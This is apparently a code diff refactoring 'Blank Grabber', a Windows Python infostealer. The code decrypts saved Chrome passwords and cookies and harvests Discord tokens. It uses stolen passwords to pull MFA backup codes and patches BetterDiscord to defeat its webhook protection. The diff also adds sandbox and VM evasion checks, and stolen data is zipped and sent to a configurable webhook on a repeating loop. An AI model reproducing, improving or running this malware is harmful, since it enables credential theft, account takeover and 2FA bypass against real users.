@@ -1,3 +1,7 @@
+#If you guys are thinking I stole the code of Hazard grabber then use it, I don't mind. But soon, you will find out the differences
+
+"""https://github.com/Blank-c/Blank-Grabber/"""
+
 global yourwebhook, pingme
 
 ##########################################
@@ -6,22 +10,15 @@ yourwebhook= "your webhook goes here" #Enter your webhook
 pingme=True #ping you?
 
 ##########################################
-import time, os, sys
+import time, os
 if not os.name=="nt":
     print('Program can only be run on Microsoft Windows!')
     time.sleep(2)
     os._exit(1)
-import requests
-import shutil 
-import sqlite3 
-from zipfile import ZipFile
-import json
-import base64
-import psutil 
-import glob
-import random
-from PIL import ImageGrab
+import requests, shutil, sqlite3, json, base64, psutil, glob, random, sys
 
+from zipfile import ZipFile
+from PIL import ImageGrab
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 from re import findall
@@ -48,8 +45,8 @@ class Blank_Grabber:
                 shutil.rmtree(self.tempfolder)
             except Exception as e:
                 pass
-        global filedb, cookiedb
-        filedb=f"{self.tempfolder2}/"+"".join([(random.choice([chr(i) for i in range(97, 123)])) for i in range(15)])+".db"
+        global passdb, cookiedb
+        passdb=f"{self.tempfolder2}/"+"".join([(random.choice([chr(i) for i in range(97, 123)])) for i in range(15)])+".db"
         cookiedb=f"{self.tempfolder2}/"+"".join([(random.choice([chr(i) for i in range(97, 123)])) for i in range(12)])+".db"
         try:
             os.mkdir(os.path.join(self.tempfolder))
@@ -58,8 +55,7 @@ class Blank_Grabber:
                 log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
                 os._exit(1)
 
-        self.tokens = []
-        self.saved = []
+        self.tokens = self.saved = []
         if os.path.exists(os.getenv("appdata")+"/BetterDiscord"):
             self.bypass_better_discord()
         self.local_state_path=f"{self.appdata}/Google/Chrome/User Data/Local State"
@@ -77,7 +73,7 @@ class Blank_Grabber:
         shutil.rmtree(self.tempfolder)
         shutil.rmtree(self.tempfolder2)
     
-    def getheaders(self, token=None, content_type="application/json"):
+    def get_headers(self, token=None, content_type="application/json"):
         headers = {
             "Content-Type": content_type,
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
@@ -87,15 +83,14 @@ class Blank_Grabber:
         return headers
         
     def bypass_better_discord(self):
-        bd = os.getenv("appdata")+"/BetterDiscord/data/betterdiscord.asar" #IDK if it work
+        bd = os.getenv("appdata")+"/BetterDiscord/data/betterdiscord.asar"
         with open(bd, "rt") as f:
-            content = f.read()
-            content2 = content.replace("api/webhooks", "BlankBuffedMe")
+            content = f.read().replace("api/webhooks", "Blank-c")
         with open(bd, 'w'): pass
         with open(bd, "wt") as f:
-            f.write(content2)
+            f.write(content)
             
-    def get_master_key(self):
+    def get_secret_key(self):
         try:
             with open(self.local_state_path, "r") as f:
                 local_state = f.read()
@@ -109,18 +104,18 @@ class Blank_Grabber:
                 log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
             return None
         
-    def decrypt_payload(self, cipher, payload):
+    def decrypt_cipher_data(self, cipher, payload):
         return cipher.decrypt(payload)
     
-    def generate_cipher(self, aes_key, iv):
+    def create_cipher(self, aes_key, iv):
         return AES.new(aes_key, AES.MODE_GCM, iv)
         
     def decrypt_password(self, ciphertext, secret_key):
         try:
             initialisation_vector = ciphertext[3:15]
             encrypted_password = ciphertext[15:-16]
-            cipher = self.generate_cipher(secret_key, initialisation_vector)
-            decrypted_pass = self.decrypt_payload(cipher, encrypted_password)
+            cipher = self.create_cipher(secret_key, initialisation_vector)
+            decrypted_pass = self.decrypt_cipher_data(cipher, encrypted_password)
             decrypted_pass = decrypted_pass.decode()  
             return decrypted_pass
         except Exception as e:
@@ -130,20 +125,18 @@ class Blank_Grabber:
         
     def get_db_connection(self, chrome_path_login_db):
         try:
-            shutil.copy(chrome_path_login_db, filedb) 
-            return sqlite3.connect(filedb)
+            shutil.copy(chrome_path_login_db, passdb) 
+            return sqlite3.connect(passdb)
         except Exception as e:
             with open(self.logfile, 'a') as log:
                 log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
     
     def grabPassword(self):
         try:
-            secret_key = self.get_master_key()
-            if secret_key is None:
+            secret_key = self.get_secret_key()
+            if not secret_key:
                 return
-            tempvar=""
-            checkvar=""
-            checkvar=""
+            tempvar= checkvar= ""
             for filename in glob.iglob(self.appdata+'/Google/Chrome/User Data/**/**', recursive=True):
                 if os.path.isfile(filename):
                     if os.path.basename(filename).lower()=="login data":
@@ -168,7 +161,7 @@ class Blank_Grabber:
                                 cursor.close()
                                 conn.close()
                                 try:
-                                    os.remove(filedb)
+                                    os.remove(passdb)
                                 except Exception as e:
                                     with open(self.logfile, 'a') as log:
                                         log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
@@ -186,7 +179,7 @@ class Blank_Grabber:
     
     def grabCookies(self):
         try:
-            secret_key = self.get_master_key()
+            secret_key = self.get_secret_key()
             if secret_key is None:
                 return
             tempvar=""
@@ -226,8 +219,8 @@ class Blank_Grabber:
                                     e.write(tempvar)
                         except Exception as e:
                             with open(self.logfile, 'a') as log:
-                                #log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
-                                print(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
+                                log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
+                                #print(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
         except Exception as e:
             with open(self.logfile, 'a') as log:
                 log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
@@ -288,28 +281,28 @@ class Blank_Grabber:
                                 grabcord(i+'/leveldb')
         
         for token in self.tokens:
-            r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
+            r = requests.get("https://discord.com/api/v9/users/@me", headers=self.get_headers(token))
             if r.status_code == 200:
                 if token in self.saved:
                     continue
                 self.saved.append(token)
-                j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
+                j = requests.get("https://discord.com/api/v9/users/@me", headers=self.get_headers(token)).json()
                 user = j["username"] + "#" + str(j["discriminator"])
                 email = j["email"].strip()
                 phone = j["phone"] if j["phone"] else "No Phone Number attached"
                 verified=j["verified"]
 
-                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
+                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.get_headers(token)).json()
                 has_nitro = False
                 has_nitro = bool(len(nitro_data) > 0)
 
-                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
+                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.get_headers(token)).text)) > 0)
                 if token=="":
                     continue
                 if email in self.passwords.keys():
                     password=f"\nPassword: {self.passwords[email]}"
                     if token.startswith("mfa."):
-                        r=requests.post("https://discord.com/api/v9/users/@me/mfa/codes", headers=self.getheaders(token), json={"password": self.passwords[email], "regenerate": False}).json()
+                        r=requests.post("https://discord.com/api/v9/users/@me/mfa/codes", headers=self.get_headers(token), json={"password": self.passwords[email], "regenerate": False}).json()
                         if not r['backup_codes'] is None:
                             self.backupcodes[user]=[i for i in r['backup_codes']]
                             with open(self.tempfolder+"//Backup Codes.txt", 'a') as e:
@@ -374,14 +367,22 @@ class Blank_Grabber:
                     zfile.write(file, os.path.basename(file))
         
 if __name__=="__main__":
-    if hasattr(sys, 'real_prefix'): #VM detection stage 1
-        print('Have a nice day1')
-        os._exit(1)
+    if hasattr(sys, 'real_prefix'): 
+        print('Have a nice day')
+        os._exit(1) #VM detection stage 1
     try:
         r=requests.get("https://BlankGrabb.er/"+"".join([(random.choice([chr(i) for i in range(97, 123)])) for i in range(5)]))
         print('Have a nice day')
         os._exit(1) #VM detection stage 2
     except requests.ConnectionError: pass
+    
+    if (int((psutil.virtual_memory().total)/1073741824)+1)<2:
+        print('Have a nice day')
+        os._exit(1) #VM detection stage 3
+        
+    if os.path.isfile('D:/TOOLS/Detonate.exe'):
+        print('Have a nice day')
+        os._exit(1) #VM detection stage 4
     
     if getattr(sys, 'frozen', False):
         frozen = True #File is exe
@@ -408,8 +409,6 @@ if __name__=="__main__":
         while True:
             try:
                 requests.get("https://www.google.com") #Checking internet connection
-                break
-            except Exception:
-                pass
-        Blank_Grabber()
-        time.sleep(1800) #30 minutes
+                Blank_Grabber()
+                time.sleep(1800) #30 minutes
+            except Exception: pass
